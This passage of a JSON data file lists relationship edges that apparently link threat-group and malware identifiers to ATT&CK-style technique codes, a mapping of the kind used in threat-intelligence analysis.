        },
        {
            "source": "S0167",
            "target": "T1053.005"
        },
        {
            "source": "S0167",
            "target": "T1113"
        },
        {
            "source": "S0167",
            "target": "T1059"
        },
        {
            "source": "S0167",
            "target": "T1027"
        },
        {
            "source": "G0052",
            "target": "S0167"
        },
        {
            "source": "S0164",
            "target": "T1059.003"
        },
        {
            "source": "S0164",
            "target": "T1070.006"
        },
        {
            "source": "S0164",
            "target": "T1070.004"
        },
        {
            "source": "S0164",
            "target": "T1543.003"
        },
        {
            "source": "S0164",
            "target": "T1105"
        },
        {
            "source": "G0052",
            "target": "S0164"
        },
        {
            "source": "G0052",
            "target": "S0154"
        },
        {
            "source": "G0053",
            "target": "S0195"
        },
        {
            "source": "S0173",
            "target": "T1572"
        },
        {
            "source": "G0053",
            "target": "S0173"
        },
        {
            "source": "S0169",
            "target": "T1074.001"
        },
        {
            "source": "S0169",
            "target": "T1560.003"
        },
        {
            "source": "S0169",
            "target": "T1036.004"
        },
        {
            "source": "S0169",
            "target": "T1543.003"
        },
        {
            "source": "S0169",
            "target": "T1005"
        },
        {
            "source": "G0053",
            "target": "S0169"
        },
        {
            "source": "G0053",
            "target": "S0029"
        },
        {
            "source": "G0053",
            "target": "S0006"
        },
        {
            "source": "G0053",
            "target": "S0005"
        },
        {
            "source": "G0059",
            "target": "S0192"
        },
        {
            "source": "S0186",
            "target": "T1071.001"
        },
        {
            "source": "S0186",
            "target": "T1059.003"
        },
        {
            "source": "S0186",
            "target": "T1059.001"
        },
        {
            "source": "S0186",
            "target": "T1547.001"
        },
        {
            "source": "S0186",
            "target": "T1082"
        },
        {
            "source": "S0186",
            "target": "T1033"
        },
        {
            "source": "S0186",
            "target": "T1012"
        },
        {
            "source": "G0059",
            "target": "S0186"
        },
        {
            "source": "G0059",
            "target": "S0029"
        },
        {
            "source": "G0059",
            "target": "S0002"
        },
        {
            "source": "G0060",
            "target": "S0596"
        },
        {
            "source": "S0473",
            "target": "T1071.001"
        },
        {
            "source": "S0473",
            "target": "T1518.001"
        },
        {
            "source": "S0473",
            "target": "T1027.003"
        },
        {
            "source": "S0473",
            "target": "T1140"
        },
        {
            "source": "S0473",
            "target": "T1105"
        },
        {
            "source": "S0473",
            "target": "T1083"
        },
        {
            "source": "S0473",
            "target": "T1082"
        },
        {
            "source": "S0473",
            "target": "T1057"
        },
        {
            "source": "S0473",
            "target": "T1055"
        },
        {
            "source": "S0473",
            "target": "T1027"
        },
        {
            "source": "S0473",
            "target": "T1016"
        },
        {
            "source": "G0060",
            "target": "S0473"
        },
        {
            "source": "S0472",
            "target": "T1573.001"
        },
        {
            "source": "S0472",
            "target": "T1071.001"
        },
        {
            "source": "S0472",
            "target": "T1132.001"
        },
        {
            "source": "S0472",
            "target": "T1518.001"
        },
        {
            "source": "S0472",
            "target": "T1518"
        },
        {
            "source": "S0472",
            "target": "T1105"
        },
        {
            "source": "S0472",
            "target": "T1083"
        },
        {
            "source": "S0472",
            "target": "T1082"
        },
        {
            "source": "S0472",
            "target": "T1057"
        },
        {
            "source": "S0472",
            "target": "T1016"
        },
        {
            "source": "G0060",
            "target": "S0472"
        },
        {
            "source": "S0471",
            "target": "T1518.001"
        },
        {
            "source": "S0471",
            "target": "T1036.004"
        },
        {
            "source": "S0471",
            "target": "T1027.003"
        },
        {
            "source": "S0471",
            "target": "T1547.001"
        },
        {
            "source": "S0471",
            "target": "T1124"
        },
        {
            "source": "S0471",
            "target": "T1106"
        },
        {
            "source": "S0471",
            "target": "T1105"
        },
        {
            "source": "S0471",
            "target": "T1082"
        },
        {
            "source": "G0060",
            "target": "S0471"
        },
        {
            "source": "S0470",
            "target": "T1071.001"
        },
        {
            "source": "S0470",
            "target": "T1059.003"
        },
        {
            "source": "S0470",
            "target": "T1027.003"
        },
        {
            "source": "S0470",
            "target": "T1140"
        },
        {
            "source": "S0470",
            "target": "T1106"
        },
        {
            "source": "S0470",
            "target": "T1105"
        },
        {
            "source": "S0470",
            "target": "T1055"
        },
        {
            "source": "G0060",
            "target": "S0470"
        },
        {
            "source": "S0469",
            "target": "T1071.001"
        },
        {
            "source": "S0469",
            "target": "T1059.003"
        },
        {
            "source": "S0469",
            "target": "T1518.001"
        },
        {
            "source": "S0469",
            "target": "T1027.003"
        },
        {
            "source": "S0469",
            "target": "T1140"
        },
        {
            "source": "S0469",
            "target": "T1105"
        },
        {
            "source": "S0469",
            "target": "T1055"
        },
        {
            "source": "G0060",
            "target": "S0469"
        },
        {
            "source": "S0187",
            "target": "T1027.005"
        },
        {
            "source": "S0187",
            "target": "T1573.001"
        },
        {
            "source": "S0187",
            "target": "T1071.001"
        },
        {
            "source": "S0187",
            "target": "T1001.002"
        },
        {
            "source": "S0187",
            "target": "T1132.001"
        },
        {
            "source": "S0187",
            "target": "T1059.003"
        },
        {
            "source": "S0187",
            "target": "T1560.001"
        },
        {
            "source": "S0187",
            "target": "T1560"
        },
        {
            "source": "S0187",
            "target": "T1056.001"
        },
        {
            "source": "S0187",
            "target": "T1003.001"
        },
        {
            "source": "S0187",
            "target": "T1036.005"
        },
        {
            "source": "S0187",
            "target": "T1553.002"
        },
        {
            "source": "S0187",
            "target": "T1027.002"
        },
        {
            "source": "S0187",
            "target": "T1113"
        },
        {
            "source": "S0187",
            "target": "T1105"
        },
        {
            "source": "S0187",
            "target": "T1027"
        },
        {
            "source": "G0060",
            "target": "S0187"
        },
        {
            "source": "G0060",
            "target": "S0111"
        },
        {
            "source": "G0060",
            "target": "S0110"
        },
        {
            "source": "G0060",
            "target": "S0106"
        },
        {
            "source": "G0060",
            "target": "S0039"
        },
        {
            "source": "S0008",
            "target": "T1003.004"
        },
        {
            "source": "S0008",
            "target": "T1003.002"
        },
        {
            "source": "G0060",
            "target": "S0008"
        },
        {
            "source": "G0060",
            "target": "S0005"
        },
        {
            "source": "G0060",
            "target": "S0002"
        },
        {
            "source": "S0176",
            "target": "T1574.002"
        },
        {
            "source": "S0176",
            "target": "T1569.002"
        },
        {
            "source": "S0176",
            "target": "T1518.001"
        },
        {
            "source": "S0176",
            "target": "T1070.004"
        },
        {
            "source": "S0176",
            "target": "T1547.008"
        },
        {
            "source": "S0176",
            "target": "T1543.003"
        },
        {
            "source": "S0176",
            "target": "T1082"
        },
        {
            "source": "S0176",
            "target": "T1068"
        },
        {
            "source": "S0176",
            "target": "T1055"
        },
        {
            "source": "G0055",
            "target": "S0176"
        },
        {
            "source": "S0477",
            "target": "T1071.004"
        },
        {
            "source": "S0477",
            "target": "T1071.003"
        },
        {
            "source": "S0477",
            "target": "T1071.001"
        },
        {
            "source": "S0477",
            "target": "T1574.002"
        },
        {
            "source": "S0477",
            "target": "T1059.005"
        },
        {
            "source": "S0477",
            "target": "T1059.003"
        },
        {
            "source": "S0477",
            "target": "T1562.001"
        },
        {
            "source": "S0477",
            "target": "T1036.005"
        },
        {
            "source": "S0477",
            "target": "T1027.001"
        },
        {
            "source": "S0477",
            "target": "T1053.005"
        },
        {
            "source": "S0477",
            "target": "T1140"
        },
        {
            "source": "S0477",
            "target": "T1106"
        },
        {
            "source": "S0477",
            "target": "T1070"
        },
        {
            "source": "S0477",
            "target": "T1057"
        },
        {
            "source": "S0477",
            "target": "T1041"
        },
        {
            "source": "S0477",
            "target": "T1033"
        },
        {
            "source": "S0477",
            "target": "T1027"
        },
        {
            "source": "S0477",
            "target": "T1005"
        },
        {
            "source": "G0050",
            "target": "S0477"
        },
        {
            "source": "S0354",
            "target": "T1071.004"
        },
        {
            "source": "S0354",
            "target": "T1132.001"
        },
        {
            "source": "S0354",
            "target": "T1574.002"
        },
        {
            "source": "S0354",
            "target": "T1574"
        },
        {
            "source": "S0354",
            "target": "T1059.003"
        },
        {
            "source": "S0354",
            "target": "T1059.001"
        },
        {
            "source": "S0354",
            "target": "T1497.001"
        },
        {
            "source": "S0354",
            "target": "T1560.002"
        },
        {
            "source": "S0354",
            "target": "T1070.004"
        },
        {
            "source": "S0354",
            "target": "T1055.012"
        },
        {
            "source": "S0354",
            "target": "T1140"
        },
        {
            "source": "S0354",
            "target": "T1106"
        },
        {
            "source": "S0354",
            "target": "T1105"
        },
        {
            "source": "S0354",
            "target": "T1083"
        },
        {
            "source": "S0354",
            "target": "T1082"
        },
        {
            "source": "S0354",
            "target": "T1033"
        },
        {
            "source": "S0354",
            "target": "T1027"
        },
        {
            "source": "S0354",
            "target": "T1016"
        },
        {
            "source": "S0354",
            "target": "T1012"
        },
        {
            "source": "G0050",
            "target": "S0354"
        },
        {
            "source": "S0352",
            "target": "T1071.001"
        },
        {
            "source": "S0352",
            "target": "T1059.005"
        },
        {
            "source": "S0352",
            "target": "T1059.004"
        },
        {
            "source": "S0352",
            "target": "T1059.001"
        },
        {
            "source": "S0352",
            "target": "T1497.001"
        },
        {
            "source": "S0352",
            "target": "T1564.001"
        },
        {
            "source": "S0352",
            "target": "T1560"
        },
        {
            "source": "S0352",
            "target": "T1036.004"
        },
        {
            "source": "S0352",
            "target": "T1553.001"
        },
        {
            "source": "S0352",
            "target": "T1027.002"
        },
        {
            "source": "S0352",
            "target": "T1070.006"
        },
        {
            "source": "S0352",
            "target": "T1070.004"
        },
        {
            "source": "S0352",
            "target": "T1543.004"
        },
        {
            "source": "S0352",
            "target": "T1543.001"
        },
        {
            "source": "S0352",
            "target": "T1105"
        },
        {
            "source": "S0352",
            "target": "T1082"
        },
        {
            "source": "S0352",
            "target": "T1027"
        },
        {
            "source": "S0352",
            "target": "T1016"
        },
        {
            "source": "S0352",
            "target": "T1005"
        },
        {
            "source": "G0050",
            "target": "S0352"
        },
        {
            "source": "S0158",
            "target": "T1059.003"
        },
        {
            "source": "S0158",
            "target": "T1112"
        },
        {
            "source": "S0158",
            "target": "T1095"
        },
        {
            "source": "S0158",
            "target": "T1094"
        },
        {
            "source": "G0050",
            "target": "S0158"
        },
        {
            "source": "S0156",
            "target": "T1059.003"
        },
        {
            "source": "S0156",
            "target": "T1082"
        },
        {
            "source": "S0156",
            "target": "T1047"
        },
        {
            "source": "G0050",
            "target": "S0156"
        },
        {
            "source": "S0155",
            "target": "T1070.004"
        },
        {
            "source": "S0155",
            "target": "T1095"
        },
        {
            "source": "S0155",
            "target": "T1094"
        },
        {
            "source": "S0155",
            "target": "T1082"
        },
        {
            "source": "S0155",
            "target": "T1033"
        },
        {
            "source": "S0155",
            "target": "T1012"
        },
        {
            "source": "G0050",
            "target": "S0155"
        },
        {
            "source": "S0157",
            "target": "T1071.004"
        },
        {
            "source": "S0157",
            "target": "T1112"
        },
        {
            "source": "S0157",
            "target": "T1083"
        },
        {
            "source": "S0157",
            "target": "T1082"
        },
        {
            "source": "S0157",
            "target": "T1010"
        },
        {
            "source": "G0050",
            "target": "S0157"
        },
        {
            "source": "G0050",
            "target": "S0154"
        },
        {
            "source": "G0050",
            "target": "S0108"
        },
        {
            "source": "G0050",
            "target": "S0100"
        },
        {
            "source": "G0050",
            "target": "S0099"
        },
        {
            "source": "G0050",
            "target": "S0039"
        },
        {
            "source": "G0050",
            "target": "S0002"
        },
        {
            "source": "G0051",
            "target": "S0363"
        },
        {
            "source": "S0495",
            "target": "T1573.001"
        },
        {
            "source": "S0495",
            "target": "T1071.004"
        },
        {
            "source": "S0495",
            "target": "T1071.003"
        },
        {
            "source": "S0495",
            "target": "T1071.001"
        },
        {
            "source": "S0495",
            "target": "T1001.002"
        },
        {
            "source": "S0495",
            "target": "T1132.002"
        },
        {
            "source": "S0495",
            "target": "T1132.001"
        },
        {
            "source": "S0495",
            "target": "T1059.003"
        },
        {
            "source": "S0495",
            "target": "T1036.005"
        },
        {
            "source": "S0495",
            "target": "T1036.004"
        },
        {
            "source": "S0495",
            "target": "T1027.003"
        },
        {
            "source": "S0495",
            "target": "T1070.004"
        },
        {
            "source": "S0495",
            "target": "T1543.003"
        },
        {
            "source": "S0495",
            "target": "T1140"
        },
        {
            "source": "S0495",
            "target": "T1113"
        },
        {
            "source": "S0495",
            "target": "T1105"
        },
        {
            "source": "S0495",
            "target": "T1041"
        },
        {
            "source": "S0495",
            "target": "T1030"
        },
        {
            "source": "S0495",
            "target": "T1008"
        },
        {
            "source": "S0495",
            "target": "T1001"
        },
        {
            "source": "G0049",
            "target": "S0495"
        },
        {
            "source": "S0360",
            "target": "T1071.004"
        },
        {
            "source": "S0360",
            "target": "T1564.003"
        },
        {
            "source": "S0360",
            "target": "T1568.002"
        },
        {
            "source": "S0360",
            "target": "T1059.003"
        },
        {
            "source": "S0360",
            "target": "T1059.001"
        },
        {
            "source": "S0360",
            "target": "T1053.005"
        },
        {
            "source": "S0360",
            "target": "T1105"
        },
        {
            "source": "G0049",
            "target": "S0360"
        },
        {
            "source": "G0049",
            "target": "S0349"
        },
        {
            "source": "S0264",
            "target": "T1071.001"
        },
        {
            "source": "S0264",
            "target": "T1132.001"
        },
        {
            "source": "S0264",
            "target": "T1074.001"
        },
        {
            "source": "S0264",
            "target": "T1059.005"
        },
        {
            "source": "S0264",
            "target": "T1059.003"
        },
        {
            "source": "S0264",
            "target": "T1497.001"
        },
        {
            "source": "S0264",
            "target": "T1560.003"
        },
        {
            "source": "S0264",
            "target": "T1560.001"
        },
        {
            "source": "S0264",
            "target": "T1027.002"
        },
        {
            "source": "S0264",
            "target": "T1070.004"
        },
        {
            "source": "S0264",
            "target": "T1053.005"
        },
        {
            "source": "S0264",
            "target": "T1140"
        },
        {
            "source": "S0264",
            "target": "T1124"
        },
        {
            "source": "S0264",
            "target": "T1105"
        },
        {
            "source": "S0264",
            "target": "T1082"
        },
        {
            "source": "S0264",
            "target": "T1047"
        },
        {
            "source": "S0264",
            "target": "T1041"
        },
        {
            "source": "S0264",
            "target": "T1030"
        },
        {
            "source": "S0264",
            "target": "T1027"
        },
        {
            "source": "G0049",
            "target": "S0264"
        },
        {
            "source": "S0269",
            "target": "T1071.004"
        },
        {
            "source": "S0269",
            "target": "T1071.001"
        },
        {
            "source": "S0269",
            "target": "T1132.001"
        },
        {
            "source": "S0269",
            "target": "T1059.005"
        },
        {
            "source": "S0269",
            "target": "T1059.003"
        },
        {
            "source": "S0269",
            "target": "T1059.001"
        },
        {
            "source": "S0269",
            "target": "T1036.005"
        },
        {
            "source": "S0269",
            "target": "T1070.004"
        },
        {
            "source": "S0269",
            "target": "T1053.005"
        },
        {
            "source": "S0269",
            "target": "T1140"
        },
        {
            "source": "S0269",
            "target": "T1112"
        },
        {
            "source": "S0269",
            "target": "T1033"
        },
        {
            "source": "S0269",
            "target": "T1027"
        },
        {
            "source": "S0269",
            "target": "T1016"
        },
        {
            "source": "S0269",
            "target": "T1012"
        },
        {
            "source": "S0269",
            "target": "T1008"
        },
        {
            "source": "G0049",
            "target": "S0269"
        },
        {
            "source": "S0258",
            "target": "T1071.001"
        },
        {
            "source": "S0258",
            "target": "T1059.003"
        },
        {
            "source": "S0258",
            "target": "T1560.003"
        },
        {
            "source": "S0258",
            "target": "T1140"
        },
        {
            "source": "S0258",
            "target": "T1105"
        },
        {
            "source": "S0258",
            "target": "T1033"
        },
        {
            "source": "G0049",
            "target": "S0258"
        },
        {
            "source": "S0185",
            "target": "T1059.003"
        },
        {
            "source": "S0185",
            "target": "T1070.006"
        },
        {
            "source": "S0185",
            "target": "T1505.003"
        },
        {
            "source": "S0185",
            "target": "T1105"
        },
        {
            "source": "G0049",
            "target": "S0185"
        },
        {
            "source": "S0189",
            "target": "T1055.012"
        },
        {
            "source": "S0189",
            "target": "T1053.005"
        },
        {
            "source": "S0189",
            "target": "T1140"
        },
        {
            "source": "S0189",
            "target": "T1027"
        },
        {
            "source": "G0049",
            "target": "S0189"
        },
        {
            "source": "S0184",
            "target": "T1071.004"
        },
        {
            "source": "S0184",
            "target": "T1071.001"
        },
        {
            "source": "S0184",
            "target": "T1132.001"
        },
        {
            "source": "S0184",
            "target": "T1069.001"
        },
        {
            "source": "S0184",
            "target": "T1059.003"
        },
        {
            "source": "S0184",
            "target": "T1059.001"
        },
        {
            "source": "S0184",
            "target": "T1518.001"
        },
        {
            "source": "S0184",
            "target": "T1069.002"
        },
        {
            "source": "S0184",
            "target": "T1087.002"
        },
        {
            "source": "S0184",
            "target": "T1053.005"
        },
        {
            "source": "S0184",
            "target": "T1113"
        },
        {
            "source": "S0184",
            "target": "T1105"
        },
        {
            "source": "S0184",
            "target": "T1083"
        },
        {
            "source": "S0184",
            "target": "T1082"
        },
        {
            "source": "S0184",
            "target": "T1057"
        },
        {
            "source": "S0184",
            "target": "T1049"
        },
        {
            "source": "S0184",
            "target": "T1047"
        },
        {
            "source": "S0184",
            "target": "T1033"
        },
        {
            "source": "S0184",
            "target": "T1016"
        },
        {
            "source": "S0184",
            "target": "T1012"
        },
        {
            "source": "G0049",
            "target": "S0184"
        },
        {
            "source": "S0170",
            "target": "T1573.001"
        },
        {
            "source": "S0170",
            "target": "T1071.004"
        },
        {
            "source": "S0170",
            "target": "T1071.001"
        },
        {
            "source": "S0170",
            "target": "T1132.001"
        },
        {
            "source": "S0170",
            "target": "T1074.001"
        },
        {
            "source": "S0170",
            "target": "T1069.001"
        },
        {
            "source": "S0170",
            "target": "T1059.005"
        },
        {
            "source": "S0170",
            "target": "T1059.003"
        },
        {
            "source": "S0170",
            "target": "T1059.001"
        },
        {
            "source": "S0170",
            "target": "T1069.002"
        },
        {
            "source": "S0170",
            "target": "T1056.001"
        },
        {
            "source": "S0170",
            "target": "T1553.002"
        },
        {
            "source": "S0170",
            "target": "T1547.009"
        },
        {
            "source": "S0170",
            "target": "T1547.001"
        },
        {
            "source": "S0170",
            "target": "T1053.005"
        },
        {
            "source": "S0170",
            "target": "T1119"
        },
        {
            "source": "S0170",
            "target": "T1115"
        },
        {
            "source": "S0170",
            "target": "T1105"
        },
        {
            "source": "S0170",
            "target": "T1057"
        },
        {
            "source": "S0170",
            "target": "T1030"
        },
        {
            "source": "S0170",
            "target": "T1027"
        },
        {
            "source": "G0049",
            "target": "S0170"
        },
        {
            "source": "G0049",
            "target": "S0160"
        },
        {
            "source": "G0049",
            "target": "S0104"
        },
        {
            "source": "G0049",
            "target": "S0100"
        },
        {
            "source": "G0049",
            "target": "S0096"
        },
        {
            "source": "G0049",
            "target": "S0095"
        },
        {
            "source": "G0049",
            "target": "S0075"
        },
        {
            "source": "G0049",
            "target": "S0057"
        },
        {
            "source": "G0049",
            "target": "S0039"
        },
        {
            "source": "G0049",
            "target": "S0029"
        },
        {
            "source": "G0049",
            "target": "S0002"
        },
        {
            "source": "S0148",
            "target": "T1573.001"
        },
        {
            "source": "S0148",
            "target": "T1071.001"
        },
        {
            "source": "S0148",
            "target": "T1102.001"
        },
        {
            "source": "S0148",
            "target": "T1571"
        },
        {
            "source": "S0148",
            "target": "T1204.002"
        },
        {
            "source": "S0148",
            "target": "T1568"
        },
        {
            "source": "S0148",
            "target": "T1059.003"
        },
        {
            "source": "S0148",
            "target": "T1566.001"
        },
        {
            "source": "S0148",
            "target": "T1518.001"
        },
        {
            "source": "S0148",
            "target": "T1553.004"
        },
        {
            "source": "S0148",
            "target": "T1559.002"
        },
        {
            "source": "S0148",
            "target": "T1056.001"
        },
        {
            "source": "S0148",
            "target": "T1036.004"
        },
        {
            "source": "S0148",
            "target": "T1553.002"
        },
        {
            "source": "S0148",
            "target": "T1070.004"
        },
        {
            "source": "S0148",
            "target": "T1548.002"
        },
        {
            "source": "S0148",
            "target": "T1547.001"
        },
        {
            "source": "S0148",
            "target": "T1218.011"
        },
        {
            "source": "S0148",
            "target": "T1053.005"
        },
        {
            "source": "S0148",
            "target": "T1518"
        },
        {
            "source": "S0148",
            "target": "T1497"
        },
        {
            "source": "S0148",
            "target": "T1219"
        },
        {
            "source": "S0148",
            "target": "T1124"
        },
        {
            "source": "S0148",
            "target": "T1120"
        },
        {
            "source": "S0148",
            "target": "T1119"
        },
        {
            "source": "S0148",
            "target": "T1115"
        },
        {
            "source": "S0148",
            "target": "T1113"
        },
        {
            "source": "S0148",
            "target": "T1112"
        },
        {
            "source": "S0148",
            "target": "T1106"
        },
        {
            "source": "S0148",
            "target": "T1105"
        },
        {
            "source": "S0148",
            "target": "T1094"
        },
        {
            "source": "S0148",
            "target": "T1083"
        },
        {
            "source": "S0148",
            "target": "T1082"
        },
        {
            "source": "S0148",
            "target": "T1070"
        },
        {
            "source": "S0148",
            "target": "T1057"
        },
        {
            "source": "S0148",
            "target": "T1036"
        },
        {
            "source": "S0148",
            "target": "T1033"
        },
        {
            "source": "S0148",
            "target": "T1027"
        },
        {
            "source": "G0048",
            "target": "S0148"
        },
        {
            "source": "S0147",
            "target": "T1071.001"
        },
        {
            "source": "S0147",
            "target": "T1074.001"
        },
        {
            "source": "S0147",
            "target": "T1059.003"
        },
        {
            "source": "S0147",
            "target": "T1070.004"
        },
        {
            "source": "S0147",
            "target": "T1547.001"
        },
        {
            "source": "S0147",
            "target": "T1218.011"
        },
        {
            "source": "S0147",
            "target": "T1053.005"
        },
        {
            "source": "S0147",
            "target": "T1113"
        },
        {
            "source": "S0147",
            "target": "T1105"
        },
        {
            "source": "S0147",
            "target": "T1083"
        },
        {
            "source": "S0147",
            "target": "T1041"
        },
        {
            "source": "G0047",
            "target": "S0147"
        },
        {
            "source": "S0517",
            "target": "T1059.001"
        },
        {
            "source": "S0517",
            "target": "T1560"
        },
        {
            "source": "S0517",
            "target": "T1070.004"
        },
        {
            "source": "S0517",
            "target": "T1546.011"
        },
        {
            "source": "S0517",
            "target": "T1055.004"
        },
        {
            "source": "S0517",
            "target": "T1140"
        },
        {
            "source": "S0517",
            "target": "T1112"
        },
        {
            "source": "S0517",
            "target": "T1106"
        },
        {
            "source": "S0517",
            "target": "T1070"
        },
        {
            "source": "S0517",
            "target": "T1057"
        },
        {
            "source": "S0517",
            "target": "T1027"
        },
        {
            "source": "S0517",
            "target": "T1012"
        },
        {
            "source": "S0517",
            "target": "T1005"
        },
        {
            "source": "G0046",
            "target": "S0517"
        },
        {
            "source": "S0417",
            "target": "T1059.007"
        },
        {
            "source": "S0417",
            "target": "T1059.001"
        },
        {
            "source": "S0417",
            "target": "T1069.002"
        },
        {
            "source": "S0417",
            "target": "T1547.001"
        },
        {
            "source": "S0417",
            "target": "T1053.005"
        },
        {
            "source": "S0417",
            "target": "T1124"
        },
        {
            "source": "S0417",
            "target": "T1113"
        },
        {
            "source": "S0417",
            "target": "T1082"
        },
        {
            "source": "G0046",
            "target": "S0417"
        },
        {
            "source": "S0416",
            "target": "T1056.004"
        },
        {
            "source": "S0416",
            "target": "T1070.004"
        },
        {
            "source": "S0416",
            "target": "T1106"
        },
        {
            "source": "G0046",
            "target": "S0416"
        },
        {
            "source": "S0415",
            "target": "T1574.001"
        },
        {
            "source": "S0415",
            "target": "T1553.002"
        },
        {
            "source": "S0415",
            "target": "T1140"
        },
        {
            "source": "S0415",
            "target": "T1129"
        },
        {
            "source": "S0415",
            "target": "T1027"
        },
        {
            "source": "G0046",
            "target": "S0415"
        },
        {
            "source": "S0390",
            "target": "T1204.002"
        },
        {
            "source": "S0390",
            "target": "T1059.003"
        },
        {
            "source": "S0390",
            "target": "T1059.001"
        },
        {
            "source": "S0390",
            "target": "T1070.004"
        },
        {
            "source": "S0390",
            "target": "T1053.005"
        },
        {
            "source": "S0390",
            "target": "T1140"
        },
        {
            "source": "S0390",
            "target": "T1105"
        },
        {
            "source": "S0390",
            "target": "T1027"
        },
        {
            "source": "G0046",
            "target": "S0390"
        },
        {
            "source": "S0151",
            "target": "T1059.001"
        },
        {
            "source": "S0151",
            "target": "T1070.004"
        },
        {
            "source": "S0151",
            "target": "T1113"
        },
        {
            "source": "S0151",
            "target": "T1082"
        },
        {
            "source": "S0151",
            "target": "T1057"
        },
        {
            "source": "S0151",
            "target": "T1047"
        },
        {
            "source": "G0046",
            "target": "S0151"
        },
        {
            "source": "S0146",
            "target": "T1071.004"
        },
        {
            "source": "S0146",
            "target": "T1059.003"
        },
        {
            "source": "G0046",
            "target": "S0146"
        },
        {
            "source": "S0145",
            "target": "T1071.004"
        },
        {
            "source": "S0145",
            "target": "T1564.004"
        },
        {
            "source": "S0145",
            "target": "T1059.001"
        },
        {
            "source": "S0145",
            "target": "T1547.001"
        },
        {
            "source": "S0145",
            "target": "T1105"
        },
        {
            "source": "S0145",
            "target": "T1012"
        },
        {
            "source": "G0046",
            "target": "S0145"
        },
        {
            "source": "S0030",
            "target": "T1573.001"
        },
        {
            "source": "S0030",
            "target": "T1071.001"
        },
        {
            "source": "S0030",
            "target": "T1132.001"
        },
        {
            "source": "S0030",
            "target": "T1059.003"
        },
        {
            "source": "S0030",
            "target": "T1114.001"
        },
        {
            "source": "S0030",
            "target": "T1056.001"
        },
        {
            "source": "S0030",
            "target": "T1021.001"
        },
        {
            "source": "S0030",
            "target": "T1070.004"
        },
        {
            "source": "S0030",
            "target": "T1136.001"
        },
        {
            "source": "S0030",
            "target": "T1547.001"
        },
        {
            "source": "S0030",
            "target": "T1055.002"
        },
        {
            "source": "S0030",
            "target": "T1219"
        },
        {
            "source": "S0030",
            "target": "T1113"
        },
        {
            "source": "S0030",
            "target": "T1094"
        },
        {
            "source": "S0030",
            "target": "T1057"
        },
        {
            "source": "S0030",
            "target": "T1043"
        },
        {
            "source": "S0030",
            "target": "T1030"
        },
        {
            "source": "S0030",
            "target": "T1027"
        },
        {
            "source": "S0030",
            "target": "T1012"
        },
        {
            "source": "S0030",
            "target": "T1003"
        },
        {
            "source": "G0046",
            "target": "S0030"
        },
        {
            "source": "G0045",
            "target": "S0552"
        },
        {
            "source": "G0045",
            "target": "S0404"
        },
        {
            "source": "G0045",
            "target": "S0357"
        },
        {
            "source": "S0275",
            "target": "T1573.001"
        },
        {
            "source": "S0275",
            "target": "T1071.001"
        },
        {
            "source": "S0275",
            "target": "T1059.003"
        },
        {
            "source": "S0275",
            "target": "T1124"
        },
        {
            "source": "S0275",
            "target": "T1113"
        },
        {
            "source": "S0275",
            "target": "T1105"
        },
        {
            "source": "S0275",
            "target": "T1083"
        },
        {
            "source": "S0275",
            "target": "T1082"
        },
        {
            "source": "S0275",
            "target": "T1033"
        },
        {
            "source": "S0275",
            "target": "T1016"
        },
        {
            "source": "G0045",
            "target": "S0275"
        },
        {
            "source": "G0045",
            "target": "S0262"
        },
        {
            "source": "G0045",
            "target": "S0194"
        },
        {
            "source": "G0045",
            "target": "S0160"
        },
        {
            "source": "S0159",
            "target": "T1573.001"
        },
        {
            "source": "S0159",
            "target": "T1071.001"
        },
        {
            "source": "S0159",
            "target": "T1059.003"
        },
        {
            "source": "S0159",
            "target": "T1547.001"
        },
        {
            "source": "G0045",
            "target": "S0159"
        },
        {
            "source": "S0152",
            "target": "T1056.001"
        },
        {
            "source": "S0152",
            "target": "T1547.001"
        },
        {
            "source": "S0152",
            "target": "T1125"
        },
        {
            "source": "S0152",
            "target": "T1123"
        },
        {
            "source": "S0152",
            "target": "T1113"
        },
        {
            "source": "S0152",
            "target": "T1043"
        },
        {
            "source": "G0045",
            "target": "S0152"
        },
        {
            "source": "S0153",
            "target": "T1573.001"
        },
        {
            "source": "S0153",
            "target": "T1071.001"
        },
        {
            "source": "S0153",
            "target": "T1571"
        },
        {
            "source": "S0153",
            "target": "T1574.001"
        },
        {
            "source": "S0153",
            "target": "T1059.003"
        },
        {
            "source": "S0153",
            "target": "T1555.003"
        },
        {
            "source": "S0153",
            "target": "T1070.004"
        },
        {
            "source": "S0153",
            "target": "T1547.009"
        },
        {
            "source": "S0153",
            "target": "T1547.001"
        },
        {
            "source": "S0153",
            "target": "T1113"
        },
        {
            "source": "S0153",
            "target": "T1105"
        },
        {
            "source": "S0153",
            "target": "T1094"
        },
        {
            "source": "S0153",
            "target": "T1083"
        },
        {
            "source": "S0153",
            "target": "T1082"
        },
        {
            "source": "S0153",
            "target": "T1065"
        },
        {
            "source": "S0153",
            "target": "T1049"
        },
        {
            "source": "S0153",
            "target": "T1043"
        },
        {
            "source": "S0153",
            "target": "T1033"
        },
        {
            "source": "S0153",
            "target": "T1027"
        },
        {
            "source": "S0153",
            "target": "T1016"
        },
        {
            "source": "G0045",
            "target": "S0153"
        },
        {
            "source": "S0144",
            "target": "T1573.001"
        },
        {
            "source": "S0144",
            "target": "T1071.001"
        },
        {
            "source": "S0144",
            "target": "T1132.001"
        },
        {
            "source": "S0144",
            "target": "T1562.001"
        },
        {
            "source": "S0144",
            "target": "T1555.003"
        },
        {
            "source": "S0144",
            "target": "T1036.005"
        },
        {
            "source": "S0144",
            "target": "T1553.002"
        },
        {
            "source": "S0144",
            "target": "T1547.001"
        },
        {
            "source": "S0144",
            "target": "T1105"
        },
        {
            "source": "S0144",
            "target": "T1083"
        },
        {
            "source": "S0144",
            "target": "T1082"
        },
        {
            "source": "S0144",
            "target": "T1057"
        },
        {
            "source": "G0045",
            "target": "S0144"
        },
        {
            "source": "G0045",
            "target": "S0106"
        },
        {
            "source": "G0045",
            "target": "S0097"
        },
        {
            "source": "G0045",
            "target": "S0039"
        },
        {
            "source": "G0045",
            "target": "S0029"
        },
        {
            "source": "G0045",
            "target": "S0013"
        },
        {
            "source": "G0045",
            "target": "S0012"
        },
        {
            "source": "G0045",
            "target": "S0006"
        },
        {
            "source": "G0045",
            "target": "S0002"
        },
        {
            "source": "S0501",
            "target": "T1547.012"
        },
        {
            "source": "S0501",
            "target": "T1573.001"
        },
        {
            "source": "S0501",
            "target": "T1518.001"
        },
        {
            "source": "S0501",
            "target": "T1134.004"
        },
        {
            "source": "S0501",
            "target": "T1134.002"
        },
        {
            "source": "S0501",
            "target": "T1036.005"
        },
        {
            "source": "S0501",
            "target": "T1553.002"
        },
        {
            "source": "S0501",
            "target": "T1548.002"
        },
        {
            "source": "S0501",
            "target": "T1543.003"
        },
        {
            "source": "S0501",
            "target": "T1055.001"
        },
        {
